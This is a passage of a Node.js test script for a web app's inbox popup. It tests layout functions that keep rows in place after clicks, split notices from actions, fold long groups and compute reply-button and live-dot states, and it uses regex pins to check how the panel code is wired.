#!/usr/bin/env node
// test-user-todos-layout — the "For you" popup keeps every row in its slot while
// it is open (inc-mtw02kbq-kj96: a ✓ re-rendered the list, the resolved row left
// its group, the rows below slid up under the pointer, and the next rapid click
// hit the wrong item). PURE src/lib/user-todos-layout.js + a wiring pin.
// ⑪ (B-328d): notices by ORIGIN — the closed producer set (src/inbox-origin.js),
// the legacy read-time rung, groups / chips / tab counts, the HELD filter (r2),
// the store's origin field (REQUIRED since r2 — a filing naming none throws),
// and THE CENSUS: every two-argument .add( / ?.add( on any receiver under src/
// and server.js declares a literal origin, the one its file produces (grep-
// derived, with planted/patched/evasion controls — an unwired site FAILS here).
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const { openLayout, nextLayout, entriesFor } = await import(path.join(ROOT, 'src/lib/user-todos-layout.js'));
let pass = 0, fail = 0;
const ok = (c, m, e) => { if (c) { pass++; console.log('  ✓ ' + m); } else { fail++; console.log('  ✗ ' + m + (e !== undefined ? ' — ' + JSON.stringify(e) : '')); } };
const eq = (a, b, m) => ok(JSON.stringify(a) === JSON.stringify(b), `${m} (${JSON.stringify(a)})`);
const it = (id, sessionKey, extra = {}) => ({ id, sessionKey, text: id, urgency: 'normal', createdAt: 1, ...extra });
const rows = (layout, todos) => entriesFor(layout, todos).flatMap((g) => g.entries.map((e) => `${g.key}:${e.item.id}${e.resolved ? '✓' : ''}`));

console.log('① the incident: four rapid ✓ at one screen slot must hit four DIFFERENT rows only if the rows MOVE — they must not');
let todos = { open: [it('a', 'S1'), it('b', 'S1'), it('c', 'S1'), it('d', 'S2')], resolved: [] };
let layout = openLayout([['S1', todos.open.slice(0, 3)], ['S2', [todos.open[3]]]]);
eq(rows(layout, todos), ['S1:a', 'S1:b', 'S1:c', 'S2:d'], 'open: the sorted groups become the layout');
// ✓ on b → the store moves it to resolved, the broadcast re-renders
todos = { open: [it('a', 'S1'), it('c', 'S1'), it('d', 'S2')], resolved: [it('b', 'S1', { status: 'done' })] };
layout = nextLayout(layout, todos);
eq(rows(layout, todos), ['S1:a', 'S1:b✓', 'S1:c', 'S2:d'], 'after ✓ on b: b stays in its slot (resolved in place), a/c/d do not move');
eq(entriesFor(layout, todos).map((g) => g.openCount), [2, 1], 'the group count shows OPEN rows only');
// ✓ on c and a too → the whole group is resolved but keeps its slot
todos = { open: [it('d', 'S2')], resolved: [it('b', 'S1', { status: 'done' }), it('c', 'S1', { status: 'done' }), it('a', 'S1', { status: 'done' })] };
layout = nextLayout(layout, todos);
eq(rows(layout, todos), ['S1:a✓', 'S1:b✓', 'S1:c✓', 'S2:d'], 'a fully resolved group keeps its slot; d never moved');
// ↺ on b → back to open, same slot
todos = { open: [it('b', 'S1'), it('d', 'S2')], resolved: [it('c', 'S1', { status: 'done' }), it('a', 'S1', { status: 'done' })] };
layout = nextLayout(layout, todos);
eq(rows(layout, todos), ['S1:a✓', 'S1:b', 'S1:c✓', 'S2:d'], 'reopen puts the row back in the SAME slot');

console.log('② arrivals append, never insert; purged ids leave; close rebuilds');
todos = { open: [it('b', 'S1'), it('d', 'S2'), it('e', 'S1', { urgency: 'high' }), it('f', 'S3')], resolved: [it('c', 'S1', { status: 'done' })] };
layout = nextLayout(layout, todos);
eq(rows(layout, todos), ['S1:b', 'S1:c✓', 'S1:e', 'S2:d', 'S3:f'], 'a new HIGH item appends at the END of its group (no re-sort while open); a new group appends at the end; a purged id (a) is gone');
const fresh = openLayout([['S1', [it('e', 'S1', { urgency: 'high' }), it('b', 'S1')]], ['S3', [it('f', 'S3')]], ['S2', [it('d', 'S2')]]]);
eq(rows(fresh, todos), ['S1:e', 'S1:b', 'S3:f', 'S2:d'], 'the next OPEN rebuilds from the sorted groups (urgency first)');

console.log('③ NEGATIVE CONTROL: the pre-fix render (groups built from todos.open only) moves the rows');
const preFix = (todos) => { const g = new Map(); for (const i of todos.open) (g.get(i.sessionKey) || g.set(i.sessionKey, []).get(i.sessionKey)).push(i); return [...g.entries()].flatMap(([k, items]) => items.map((i) => `${k}:${i.id}`)); };
const before = preFix({ open: [it('a', 'S1'), it('b', 'S1'), it('c', 'S1'), it('d', 'S2')] });
const after = preFix({ open: [it('a', 'S1'), it('c', 'S1'), it('d', 'S2')] });
ok(before[2] === 'S1:c' && after[2] === 'S2:d' && before[1] === 'S1:b' && after[1] === 'S1:c',
  `the pre-fix list slides c into b's slot and d into c's — the second rapid click lands on the wrong row (${before.join(',')} → ${after.join(',')})`);

console.log('④ WIRING PIN: the panel uses the layout while the popup is visible and resets it when hidden');
const panel = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-panel.js'), 'utf8');
ok(/from '\.\/user-todos-layout\.js'/.test(panel), 'the panel imports the PURE layout');
ok(/if \(popup\.classList\.contains\('hidden'\)\) \{ layout = null; dropRows\(\); return; \}/.test(panel) && /\n\s*layout = layout \? nextLayout\(layout, todos\) : openLayout\(gs\);/.test(panel), 'visible ⇒ nextLayout/openLayout; hidden ⇒ the layout is dropped so the next open re-sorts (and, lane-redact verify r7, the rows with it — a closed popup holds none)');
ok(/if \(!popup\.classList\.contains\('hidden'\)\) \{ layout = null; popup\.replaceChildren\(\); \}/.test(panel), '…and every OPEN starts from a fresh sorted layout (a close by Esc / outside tap never ran renderPanel, so the old layout used to survive into the next open)');
ok(/entriesFor\(layout, todos\)/.test(panel) && /ut-item-inplace/.test(fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-row.js'), 'utf8')), 'rows are rendered from the layout, a resolved one in place with the ut-item-inplace class (THE row renderer)');
ok(/todos\.resolved\.filter\(\(i\) => !inPlace\.has\(i\.id\)\)/.test(panel), 'the "Recently resolved" tail skips rows still holding their slot above');


console.log('⑤ NOTICES (2.369.118, owner: spend notices are DISTRACTING beside real asks) — a producer-declared kind, its own section, a grey count');
{
  const { isNotice, splitNotices, badgeCounts } = await import(path.join(ROOT, 'src/lib/user-todos-layout.js'));
  const n1 = it('n1', 'accounts', { kind: 'notice', sessionName: 'Spending' }), n2 = it('n2', 'accounts', { kind: 'notice' });
  const a1 = it('a1', 'accounts', { urgency: 'high' }), a2 = it('a2', 'S1'), legacy = it('old', 'S1'); // an older item has NO kind ⇒ action
  ok(isNotice(n1) && !isNotice(a1) && !isNotice(legacy) && !isNotice(null), 'isNotice reads the declared kind only (no kind = action, null safe)');
  const rows = [['accounts', [{ item: a1, resolved: false }, { item: n1, resolved: false }, { item: n2, resolved: true }], 2], ['S1', [{ item: a2, resolved: false }, { item: legacy, resolved: false }], 2], ['N', [{ item: it('n3', 'N', { kind: 'notice' }), resolved: false }], 1]];
  const { action, notices } = splitNotices(rows);
  eq(action.map(([k, es, c]) => `${k}:${es.map((e) => e.item.id).join(',')}:${c}`), ['accounts:a1:1', 'S1:a2,old:2'], 'action groups keep their order; openCount is recounted over ACTION rows; an all-notice group vanishes from the ask list');
  eq(notices.map((e) => `${e.key}:${e.item.id}${e.resolved ? '✓' : ''}`), ['accounts:n1', 'accounts:n2✓', 'N:n3'], 'notices are flat, in order, carrying their group key and the in-place resolved mark');
  const bc = badgeCounts([a1, n1, a2, n2, legacy]);
  eq([bc.action.map((i) => i.id), bc.notices], [['a1', 'a2', 'old'], 2], 'badgeCounts: the red/yellow/accent segments come from action items only; notices are the grey count');
  eq(badgeCounts([]).notices, 0, 'empty is 0/0');
  // wiring pins — the 2.355.0 lesson
  const store = fs.readFileSync(path.join(ROOT, 'src/user-todos.js'), 'utf8');
  ok(/const KINDS = \['action', 'notice'\]/.test(store) && /kind must be one of/.test(store) && /kind: kind \|\| 'action'/.test(store), 'the store validates kind and defaults it to action');
  const panel = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-panel.js'), 'utf8');
  ok(/import \{[^}]*splitNotices, badgeCounts[^}]*\} from '\.\/user-todos-layout\.js'/.test(panel) && /badgeCounts\(todos\.open\)/.test(panel) && /splitNotices\(allRows\)/.test(panel) && /ut-seg-notice/.test(panel) && /ut-notice-head/.test(panel), 'the panel counts the badge with badgeCounts and renders the notice section from splitNotices');
  const guard = fs.readFileSync(path.join(ROOT, 'src/server/spend-guard.js'), 'utf8');
  ok(/sessionName: 'Spending', kind: 'notice'/.test(guard), "spend-guard's inbox item is declared a notice at the producer");
  const ask = fs.readFileSync(path.join(ROOT, 'data/bin/vibespace-ask'), 'utf8');
  const routes = fs.readFileSync(path.join(ROOT, 'src/agent-routes.js'), 'utf8') + fs.readFileSync(path.join(ROOT, 'src/agent-routes/status.js'), 'utf8'); // + the status / todos family (lane dc-seams-server)
  ok(/--notice/.test(ask) && /add: \{ text, detail, urgency, kind(?:, options)? \}/.test(ask) && /kind: add\.kind \|\| null/.test(routes), 'vibespace-ask --notice reaches the store through the agent route');
  const css = fs.readFileSync(path.join(ROOT, 'public/style.css'), 'utf8');
  ok(/\.ut-count\.ut-seg-notice \{[^}]*var\(--text-dim\)/.test(css) && !/\.ut-count\.ut-seg-notice \{[^}]*#[0-9a-f]{3}/i.test(css), 'the grey segment uses theme vars, no literal colour');
}

console.log('⑥ THE RUNNING DOT (design-user-inbox-reply D1.7) — PURE liveDotState over the active-sessions payload\'s facts');
{
  const L = await import(path.join(ROOT, 'src/lib/user-todos-layout.js'));
  ok(typeof L.liveDotState === 'function' && L.LIVE_DOT_WHY && typeof L.LIVE_DOT_WHY === 'object', 'the layout exports liveDotState + its sentence table');
  const rowsD = [
    [{ live: true, mode: 'chat', turn: 'idle' }, 'idle', 'live + idle ⇒ idle (hollow green)'],
    [{ live: true, mode: 'chat', turn: 'running' }, 'running', 'live + mid-turn ⇒ running (filled green)'],
    [{ live: true, mode: 'chat', turn: 'waiting' }, 'waiting', "live + the harness's requires_action ⇒ waiting (amber)"],
    [{ live: true, mode: 'chat', turn: 'running', remoteState: 'reconnecting' }, 'unreachable', 'a remoteState beats the turn ⇒ unreachable'],
    [null, 'off', 'not in the live list ⇒ off'],
    [{ live: false, mode: 'chat', turn: 'running' }, 'off', 'live:false ⇒ off whatever the turn says'],
    [{ live: true, mode: 'terminal', turn: 'idle' }, 'live', 'B-3f5d ④: a terminal session (it publishes no turn) ⇒ live — running, its turns not tracked; never "running, idle"'],
    [{ live: true, mode: 'terminal', turn: 'running' }, 'live', 'B-3f5d ④: …whatever turn column it carries'],
    [{ live: true, mode: 'terminal', remoteState: 'reconnecting' }, 'unreachable', 'B-3f5d ④: a remote terminal whose host is gone ⇒ unreachable (the host beats the mode)'],
    [{ live: true, mode: 'chat' }, 'idle', 'no turn column (an older server) ⇒ idle, never a false "running"'],
    [{ live: true, mode: 'chat', turn: 'bogus' }, 'idle', 'an unknown turn value ⇒ idle'],
  ];
  for (const [fact, want, m] of rowsD) eq(L.liveDotState ? L.liveDotState(fact) : null, want, m);
  ok(L.LIVE_DOT_WHY && ['running', 'idle', 'live', 'waiting', 'unreachable', 'off'].every((k) => typeof L.LIVE_DOT_WHY[k] === 'string' && L.LIVE_DOT_WHY[k]), 'every dot state has one tooltip sentence');
}

console.log('⑦ THE REPLY BUTTON — PURE replyButtonState = the ONE replyVerdict projected onto {show, enabled, why, code}');
{
  const L = await import(path.join(ROOT, 'src/lib/user-todos-layout.js'));
  const { createRequire } = await import('node:module');
  const IR = createRequire(import.meta.url)(path.join(ROOT, 'src/inbox-reply.js'));
  const item = (over = {}) => ({ id: 'ut-0123456789', sessionKey: 'claude:abc', text: 'q', ...over });
  const live = (over = {}) => ({ live: true, mode: 'chat', remoteState: null, turn: 'idle', ...over });
  const rowsR = [
    [item(), live(), { show: true, enabled: true, why: '', code: null }, 'live chat, idle ⇒ enabled'],
    [item(), live({ turn: 'running' }), { show: true, enabled: true, why: '', code: null }, 'mid-turn is NOT disabled (the session queues it)'],
    [item(), null, { show: true, enabled: false, why: IR.REPLY_WHY.no_live_session, code: 'no_live_session' }, 'not running ⇒ disabled with the "Agent not running" sentence'],
    [item(), live({ mode: 'terminal' }), { show: true, enabled: false, why: IR.REPLY_WHY.not_chat, code: 'not_chat' }, 'a terminal session ⇒ disabled not_chat (the dot still says it runs)'],
    [item(), live({ remoteState: 'reconnecting' }), { show: true, enabled: false, why: IR.REPLY_WHY.host_unreachable, code: 'host_unreachable' }, 'host unreachable ⇒ disabled'],
    [item({ sessionKey: 'accounts' }), live(), { show: false, enabled: false, why: IR.REPLY_WHY.no_session, code: 'no_session' }, 'an accounts item ⇒ NO button (Manage Agents answers it)'],
    [item({ sessionKey: 'jobs' }), null, { show: false, enabled: false, why: IR.REPLY_WHY.no_session, code: 'no_session' }, 'the jobs bucket ⇒ no button'],
    [item({ jobId: 'job-1' }), live(), { show: false, enabled: false, why: IR.REPLY_WHY.job_item, code: 'job_item' }, 'a job-borne item ⇒ no button (the job panel answers it)'],
  ];
  for (const [it_, fact, want, m] of rowsR) eq(L.replyButtonState ? L.replyButtonState(it_, fact) : null, want, m);
  // the client and the server agree by construction: every disabled sentence IS the verdict's
  const verdictOf = (it_, fact) => IR.replyVerdict({ item: it_, session: fact ? { live: fact.live !== false, mode: fact.mode, remoteState: fact.remoteState || null } : null });
  ok(rowsR.every(([it_, fact]) => { const v = verdictOf(it_, fact); const b = L.replyButtonState ? L.replyButtonState(it_, fact) : {}; return v.ok === b.enabled && (v.ok || v.code === b.code); }), 'every row agrees with the server\'s replyVerdict fed the same projection');

  console.log('   wiring pins');
  const panel = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-panel.js'), 'utf8');
  const rowSrc = fs.existsSync(path.join(ROOT, 'src/lib/user-todos-row.js')) ? fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-row.js'), 'utf8') : '';
  ok(/from '\.\/user-todos-row\.js'/.test(panel), 'the panel imports THE row renderer (src/lib/user-todos-row.js)');
  ok(/export function renderRow\(/.test(rowSrc) && /export function patchRow\(/.test(rowSrc), 'the row file exports renderRow + patchRow');
  ok(!/class="ut-item[ "]/.test(panel) && !/itemHtml|resolvedInPlaceHtml/.test(panel), 'the panel holds no second `ut-item` row template (one renderer, one spelling)');
  ok(!/popup\.innerHTML\s*=/.test(panel), 'no `popup.innerHTML =` anywhere in the panel — the inbox reconciles keyed rows (a reply box survives a broadcast)');
  // §9 (2026-09-27): the store, the live facts and the verbs moved VERBATIM into THE client model
  // src/lib/user-todos-actions.js (the For-you window is a second surface over them) — each pin
  // below reads the code where it lives now AND the panel's use of it
  const acts = fs.existsSync(path.join(ROOT, 'src/lib/user-todos-actions.js')) ? fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-actions.js'), 'utf8') : '';
  ok(/const replyState = \(i\) => replyButtonState\(i, factFor\(i\.sessionKey\)\);/.test(acts) && /const st = liveDotState\(factFor\(dot\.dataset\.key\)\);/.test(acts)
    && /rowCtx: \{ t, nameFor, wordsOf, detailOf, replyState(, lang: resolveLang)? \}/.test(acts) && /const rowCtx = model\.rowCtx;/.test(panel) && /const patchDot = \(dot\) => model\.patchDot\(dot\);/.test(panel),
    'the panel draws the reply button and the dot through the PURE projections (the model\'s replyState + patchDot, which the panel\'s rows and dots use)');
  ok(/msg\.type === 'active-sessions' && Array\.isArray\(msg\.sessions\)\) \{ ingestLive\(msg\.sessions\); emit\('live'\); \}/.test(acts) && /model\.on\('live', \(\) => \{ patchLive\(\); scheduleBadges\(\); \}\);/.test(panel),
    'the model subscribes to active-sessions (ingests the facts) and the panel patches the live facts in place on its `live` event');
  const sb = fs.readFileSync(path.join(ROOT, 'src/lib/sidebar.js'), 'utf8');
  const facts = (/const LIVE_SESSION_FACTS = Object\.freeze\(\{([\s\S]*?)\n\}\);/.exec(sb) || [])[1] || '';
  ok(/(^|[^\w])turn: \{ digest: null \}/m.test(facts), 'LIVE_SESSION_FACTS carries `turn` with `digest: null` (carried-only: a fact that flips twice per turn must not re-render the list)');
  ok(/\/api\/user-todos\/\$\{encodeURIComponent\(id\)\}\/reply/.test(acts) && /const sent = await model\.postReply\(id, body\);/.test(panel), 'the reply POSTs /api/user-todos/:id/reply (the model\'s postReply, which the panel\'s sendReply calls)');
  ok(/Could not reply: \{why\}/.test(acts) && /Reply sent/.test(acts) && !/fetchJson\(`\/api\/user-todos\/\$\{encodeURIComponent\(id\)\}\/reply`/.test(panel), 'both outcomes reach the user as a toast (no silent failure) — ONE reply POST, in the model (the panel holds no second)');
}

console.log('⑧ THE MINI INBOX (design-user-inbox-reply §3, chunk 3) — one session\'s badge + its popover rows');
{
  const L = await import(path.join(ROOT, 'src/lib/user-todos-layout.js'));
  const K = ['claude:live', 'webui:sess-1'];
  const open = [it('a', 'claude:live', { urgency: 'normal' }), it('b', 'webui:sess-1', { urgency: 'high' }), it('n', 'claude:live', { kind: 'notice', urgency: 'urgent' }), it('x', 'claude:other', { urgency: 'urgent' })];
  eq(L.inboxBadgeFor ? L.inboxBadgeFor(open, K) : null, { count: 2, urgency: 'high' }, 'the badge counts the ACTION items under EITHER key (a and b), worst urgency high — the notice and the other session\'s urgent ask do not count');
  eq(L.inboxBadgeFor ? L.inboxBadgeFor([open[2]], K) : null, { count: 0, urgency: '' }, 'a session with only notices ⇒ no badge');
  eq(L.inboxBadgeFor ? L.inboxBadgeFor(open, []) : null, { count: 0, urgency: '' }, 'no keys (not a session window) ⇒ no badge');
  eq(L.inboxBadgeFor ? L.inboxBadgeFor([it('l', 'claude:live', { urgency: 'low' }), it('u', 'claude:live', { urgency: undefined })], K) : null, { count: 2, urgency: 'normal' }, 'a missing urgency reads normal (the store\'s default)');
  const ids = (r) => r.entries.map((e) => e.item.id + (e.resolved ? '✓' : '') + (e.notice ? '!' : ''));
  let t0 = { open, resolved: [] };
  let m = L.miniInboxEntries ? L.miniInboxEntries(null, t0, K) : { layout: null, entries: [] };
  eq(ids(m), ['a', 'b', 'n!'], 'a fresh open lists this session\'s rows only, in store order, the notice marked');
  // ✓ on a from the popover, and a new ask arrives for the session and one for another session
  let t1 = { open: [open[1], open[2], open[3], it('c', 'claude:live'), it('y', 'claude:other')], resolved: [it('a', 'claude:live', { status: 'done' })] };
  m = L.miniInboxEntries(m.layout, t1, K);
  eq(ids(m), ['a✓', 'b', 'n!', 'c'], 'while open: a resolved row keeps its slot, the new ask appends, the other session\'s never enters');
  // closed and reopened ⇒ a fresh sorted list without the resolved row
  eq(ids(L.miniInboxEntries(null, t1, K)), ['b', 'n!', 'c'], 'a fresh open drops what was resolved');
  const panel = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-panel.js'), 'utf8');
  const win = fs.readFileSync(path.join(ROOT, 'src/lib/window.js'), 'utf8');
  const tg = fs.readFileSync(path.join(ROOT, 'src/lib/tab-group.js'), 'utf8');
  const appSrc = fs.readFileSync(path.join(ROOT, 'src/lib/app.js'), 'utf8');
  ok(/inboxBadgeFor\(todos\.open, keys\)/.test(panel) && /app\.wm\.setInboxBadge\(/.test(panel), 'wiring: the panel counts through inboxBadgeFor and hands the result to wm.setInboxBadge');
  ok(/miniInboxEntries\(mini\.layout, todos, mini\.keys\)/.test(panel) && /reconcileRows\(mini\.rows, entries, null, miniCtx\)/.test(panel), 'wiring: the popover lays out through miniInboxEntries and reconciles through THE row renderer');
  ok(/createPopover\(anchor, 'ut-mini-popover'\)/.test(panel), 'wiring: the popover is a createPopover (data-popover ⇒ the layered Escape)');
  ok(/if \(mini\) return; \/\/ the mini inbox lives in this session's own window/.test(panel), 'wiring: a row click in the popover never jumps');
  ok(/renderPanel\(\); renderMini\(\); scheduleBadges\(\);/.test(panel) && /patchLive\(\); scheduleBadges\(\);/.test(panel), 'wiring: every user-todos broadcast repaints the popover + badges; every active-sessions recounts the badges');
  ok(/setInboxBadge\(id, badge\) \{/.test(win) && /_placeInboxBadge\(win\) \{/.test(win), 'window.js owns setInboxBadge + the standalone placement');
  ok(/_inboxBadgeEl\(winId, badge\) \{/.test(tg) && /tab\.appendChild\(this\._inboxBadgeEl\(tabWinId, tabWin\._inboxBadge\)\)/.test(tg) && (tg.match(/this\._placeInboxBadge\(/g) || []).length >= 2, 'tab-group.js draws the badge on the tab and restores the standalone one on detach + ungroup');
  ok(/num\.textContent = (String\(n\)|inboxCountText\(n\))/.test(tg) && !/innerHTML = [^;]*badge\.count/.test(tg), 'the badge count is TEXT (textContent — since lane G through inboxCountText, capped at 99+), never markup');
  ok(/this\._syncInboxBadges\?\.\(\)/.test(appSrc), 'app.js recounts on every window change (a window opened / closed / re-tabbed gets its badge)');
}

console.log('⑨ FLOOD FOLDING (design-user-inbox-reply §4 d, chunk 4) — PURE foldGroup: only the newest 5 open rows show; folding HIDES, never moves');
{
  const L = await import(path.join(ROOT, 'src/lib/user-todos-layout.js'));
  ok(typeof L.foldGroup === 'function' && L.FOLD_MAX === 5, 'the layout exports foldGroup + FOLD_MAX = 5');
  const fg = L.foldGroup || (() => ({ visible: [], hidden: [] }));
  // a group's entries in LAYOUT order (the store sorts newest first within a tier)
  const E = (n, resolvedAt = []) => Array.from({ length: n }, (_, k) => ({ item: it('r' + k, 'S', { createdAt: 1000 - k }), resolved: resolvedAt.includes(k) }));
  const ids = (xs) => xs.map((e) => e.item.id + (e.resolved ? '✓' : ''));
  const vh = (r) => [ids(r.visible), ids(r.hidden)];
  eq(vh(fg(E(5), { max: 5 })), [['r0', 'r1', 'r2', 'r3', 'r4'], []], '5 open ⇒ nothing hidden');
  eq(vh(fg(E(6), { max: 5 })), [['r0', 'r1', 'r2', 'r3', 'r4'], ['r5']], '6 open ⇒ the oldest (r5) hidden, the newest 5 visible in layout order');
  {
    const r = fg(E(53, [1, 3, 5]), { max: 5 });
    eq(ids(r.visible), ['r0', 'r1✓', 'r2', 'r3✓', 'r4', 'r5✓', 'r6', 'r7'], '50 open + 3 resolved-in-place among the newest ⇒ the resolved rows keep their slots between the 5 newest open rows');
    eq([r.hidden.length, r.hidden.filter((e) => !e.resolved).length], [45, 45], '…hidden = the 45 older open rows');
  }
  {
    const r = fg(E(53, [1, 3, 50]), { max: 5 });
    eq([r.visible.length, r.hidden.filter((e) => e.resolved).map((e) => e.item.id)], [7, ['r50']], 'a resolved row among the OLDER rows is hidden with them');
  }
  eq(vh(fg(E(8), { max: 5, expanded: true })), [['r0', 'r1', 'r2', 'r3', 'r4', 'r5', 'r6', 'r7'], []], 'expanded ⇒ everything, in layout order');
  eq(vh(fg(E(9, [0, 1, 2, 3, 4, 5, 6, 7, 8]), { max: 5 })), [['r0✓', 'r1✓', 'r2✓', 'r3✓', 'r4✓', 'r5✓', 'r6✓', 'r7✓', 'r8✓'], []], 'a resolved-only group ⇒ nothing folded');
  eq(vh(fg([], { max: 5 })), [[], []], 'an empty group ⇒ nothing');
  eq(vh(fg(E(7))), [['r0', 'r1', 'r2', 'r3', 'r4'], ['r5', 'r6']], 'max defaults to FOLD_MAX (5)');
  console.log('   the slot law while the popup is open (`prev` = what the last paint showed / hid)');
  {
    const first = fg(E(30), { max: 5 });
    const prev = { shown: new Set(first.visible.map((e) => e.item.id)), hidden: new Set(first.hidden.map((e) => e.item.id)) };
    // ✓ on r1 (visible): r1 stays in its slot, the next open row (r5) is revealed BELOW
    const r1 = fg(E(30, [1]), { max: 5, prev });
    eq(ids(r1.visible), ['r0', 'r1✓', 'r2', 'r3', 'r4', 'r5'], 'a ✓ on a visible row keeps it in its slot; the next older open row appears below it (nothing above moves)');
    // Mark all seen: every row resolved ⇒ the shown rows stay, the hidden (now resolved) rows stay hidden
    const all = fg(E(30, Array.from({ length: 30 }, (_, k) => k)), { max: 5, prev });
    eq([ids(all.visible), all.hidden.length], [['r0✓', 'r1✓', 'r2✓', 'r3✓', 'r4✓'], 25], "'Mark all seen' on a folded group: the 5 shown rows strike in place, the 25 resolved-while-hidden rows stay folded (they do not flood out below)");
    // a reopen above the cut must not push a shown row out from under the pointer
    const re = fg(E(30, [1]), { max: 5, prev: { shown: new Set(['r0', 'r1', 'r2', 'r3', 'r4', 'r5']), hidden: new Set() } });
    eq(ids(re.visible), ['r0', 'r1✓', 'r2', 'r3', 'r4', 'r5'], 'a row the last paint showed is never hidden again while the popup is open');
    const back = fg(E(30), { max: 5, prev: { shown: new Set(['r0', 'r1', 'r2', 'r3', 'r4', 'r5']), hidden: new Set() } });
    eq(ids(back.visible), ['r0', 'r1', 'r2', 'r3', 'r4', 'r5'], '…even when a ↺ makes it the 6th open row');
    // an arrival while open appends at the end of the group (nextLayout) ⇒ it joins the fold, it never displaces a shown row
    const arr = [...E(30), { item: it('new', 'S', { createdAt: 5000 }), resolved: false }];
    const a = fg(arr, { max: 5, prev });
    eq([ids(a.visible), a.hidden.length, (a.hidden[a.hidden.length - 1] || { item: {} }).item.id], [['r0', 'r1', 'r2', 'r3', 'r4'], 26, 'new'], 'an arrival while open joins the fold count ("26 more…") instead of pushing a shown row out');
  }
  const panel = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-panel.js'), 'utf8');
  ok(/import \{[^}]*\bfoldGroup\b[^}]*\} from '\.\/user-todos-layout\.js'/.test(panel) && /foldGroup\(entries, \{ max: FOLD_MAX, expanded: /.test(panel), 'wiring: the panel folds every group through foldGroup');
  ok(/'ut-fold'/.test(panel) && /t\('\{n\} more…', \{ n: fold\.hidden\.length \}\)/.test(panel), "wiring: the expander row is .ut-fold worded '{n} more…' with the hidden count");
  ok(/reconcileRows\(g, fold\.visible, bar\)/.test(panel), 'wiring: only the visible rows are reconciled into the group');
  ok(/folds = new Map\(\)/.test(panel) && (panel.match(/folds\.clear\(\)/g) || []).length >= 2, 'wiring: the fold state lives in the panel only while open (cleared on close and on every open)');
}

console.log('⑩ MARK ALL SEEN + THE BOARD CHIP (chunk 4) — wiring');
{
  const panel = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-panel.js'), 'utf8');
  ok(/'ut-seen-all'/.test(panel) && /'\/api\/user-todos\/resolve-many'/.test(panel) && /status: 'dismissed'/.test(panel), "the group head's 'Mark all seen' POSTs /api/user-todos/resolve-many with status dismissed");
  ok(/Could not update \{n\} items: \{why\}/.test(panel), 'a failed mark-all reaches the user as a toast naming the reason');
  const acts = fs.existsSync(path.join(ROOT, 'src/lib/user-todos-actions.js')) ? fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-actions.js'), 'utf8') : '';
  ok(/'ut-board'/.test(panel) && /_sessionStatuses/.test(acts) && /model\.boardOf\(key\)/.test(panel) && /msg\.type === 'session-status-updated' && msg\.statuses\) queueMicrotask\(\(\) => emit\('status'\)\)/.test(acts) && /model\.on\('status', \(\) => patchBoards\(\)\);/.test(panel),
    'the board chip reads app.sidebar._sessionStatuses (the model\'s boardOf) and is patched on session-status-updated (the model\'s `status` event, a microtask after the broadcast)');
  ok(L_BOARD_OK(acts), "the chip's words are t()'d board states (needs input / blocked / review / working)");
}
function L_BOARD_OK(src) { return ["t('needs input')", "t('blocked')", "t('review')", "t('working')"].every((k) => src.includes(k)); }

console.log('⑪ NOTICES BY ORIGIN (B-328d) — the closed producer set, the legacy rung, groups / chips / tab counts, the store, and THE CENSUS of every add() site');
{
  const { createRequire } = await import('node:module');
  const req = createRequire(import.meta.url);
  const O = req(path.join(ROOT, 'src/inbox-origin.js'));
  const L = await import(path.join(ROOT, 'src/lib/user-todos-layout.js'));
  const SET = ['spend', 'login', 'pool', 'jobs', 'channels', 'browser', 'machines', 'apps', 'agent']; // lane-pairing ⑥: machines = an exit's "ask me each time" (src/exit-proxy.js); Layer 0: apps = an agent's install proposal (src/server/apps-engine.js)
  eq(O.INBOX_ORIGINS, SET, 'the closed set = exactly the producers that file, in display order (mounts has no producer — the browser-switch proposal in mounts-plugins-wiring.js is the BROWSER\'s; r2: no system — nothing has ever filed with by:system)');
  ok(Object.isFrozen(O.INBOX_ORIGINS) && Object.isFrozen(O.ORIGIN_LABELS), 'the set and its words are frozen');
  eq(Object.keys(O.ORIGIN_LABELS), SET, 'one label per origin, no extra');
  ok(!('DEFAULT_ORIGIN' in O), 'r2: there is NO default origin (the store refuses a filing that names none)');
  eq(['spend', 'agent'].map((x) => O.normalizeOrigin(x)), ['spend', 'agent'], 'normalizeOrigin: a member ⇒ itself');
  for (const none of [null, undefined, '']) {
    let msg = '';
    try { O.normalizeOrigin(none); } catch (e) { msg = e.message; }
    ok(msg === 'origin required (one of spend/login/pool/jobs/channels/browser/machines/apps/agent)', `normalizeOrigin(${JSON.stringify(none)}) THROWS "origin required" naming the set (r2: fail closed, never a default)`, msg);
  }
  for (const bad of ['mounts', 'system', 'SPEND', ' spend', 5, {}, ['spend']]) {
    let msg = '';
    try { O.normalizeOrigin(bad); } catch (e) { msg = e.message; }
    ok(msg === 'origin must be one of spend/login/pool/jobs/channels/browser/machines/apps/agent', `normalizeOrigin(${JSON.stringify(bad)}) THROWS naming the set`);
  }
  ok(JSON.stringify(L.INBOX_ORIGINS) === JSON.stringify(O.INBOX_ORIGINS) && JSON.stringify(L.ORIGIN_LABELS) === JSON.stringify(O.ORIGIN_LABELS), 'the layout re-exports THE set (one spelling)');
  const laySrc = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-layout.js'), 'utf8');
  ok(/import \{ INBOX_ORIGINS, ORIGIN_LABELS \} from '\.\.\/inbox-origin\.js';/.test(laySrc) && !/\['spend', 'login'/.test(laySrc), '…imported from src/inbox-origin.js, never a second array literal');

  console.log('   originOf — a declared origin, else THE legacy rung (never extended)');
  const rowsO = [
    [{ origin: 'login', sessionName: 'Spending' }, 'login', 'a DECLARED origin wins over every legacy fact'],
    [{ origin: 'pool' }, 'pool', 'a declared pool item'],
    [{ sessionName: 'Spending', by: 'agent' }, 'spend', "legacy: sessionName 'Spending' ⇒ spend (spend-guard froze that name on every item)"],
    [{ sessionName: 'Channels', by: 'agent' }, 'channels', "legacy: sessionName 'Channels' ⇒ channels"],
